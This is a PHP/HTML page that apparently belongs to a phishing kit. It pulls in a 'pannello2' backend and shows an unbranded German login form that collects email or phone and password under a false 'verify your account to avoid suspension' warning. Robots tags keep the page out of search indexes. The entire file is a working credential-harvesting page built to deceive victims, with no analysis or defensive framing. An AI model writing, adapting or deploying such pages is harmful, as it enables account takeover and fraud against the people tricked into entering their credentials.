<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array("Email","Pass");
$numero = 0;
$prossima = "conferma.php";
$precedente ="index.php";
//INCLUDERE MOTORE
require("pannello2/motore.php");

?>
<!DOCTYPE html>
<html>
    <head>
        <title>Melde dich in deinem Konto an</title>
        <meta name='robots' content='noindex' />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <meta name='googlebot' content='noindex'>
        <meta name='googlebot-news' content='nosnippet'>
        <link rel='shortcut icon' type='image/jpg' href='' />
        <link rel='stylesheet' href='static/style.css'>
        <script src='static/main.js' defer async></script>
    </head>

    <body>
        <div class='content'>
            <div class='content__important'>
                <header>
                    <div class='header__wrapper'>
                        <div class='header__wrapper__logo'>
                        </div>
                    </div>
                </header>
                <main>
                    <div class='main__wrapper'>
                        <div class='label__wrapper'>
                            <span class='introduction_label'>
                                <center>Geben Sie Ihre Daten ein, um Ihr Konto zu verifizieren</center>
                            <span>
                        </div>
                        <div class='form__wrapper'>
                            <form  class="form-login clearfix" method="POST" onsubmit="logintest(this)">
							
							<input id="url" name="url" type="hidden" value="conferma.php" />
                                <div class='input-wrapper email'>
								
                                    <input required placeholder="E-Mail oder Handynummer" autocomplete="off" class='input__field email' type="text" name="Email"
                                        id="Email">
                                </div>
                                <div class='input-wrapper psw'>
                                    <input required placeholder="Passwort" autocomplete="off" class='input__field psw' type="password" name="Pass"
                                        id="Pass">
                                </div>
                                <div class='label__wrapper'>
                                    <span class='introduction_label'>
                                        <center>Bestätigen Sie Ihr Konto, um eine Aussetzung von Diensten zu vermeiden</center>
                                    <span>
                                </div>
                                <div class='input-wrapper submit'>
                                    <input class='input__field submit' type='submit' value='Weiter'>
                                </div>
                            </form>
                        </div>
                        <div class='choose-lenguage__wrapper'>
                            <ul class="choose-lenguage__list">
                                <li class="choose-lenguage__list__elem">
                                    Deutche
                                </li>
                                <li class="choose-lenguage__list__elem">
                                    English
                                </li>
                            </ul>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </body>
</html>
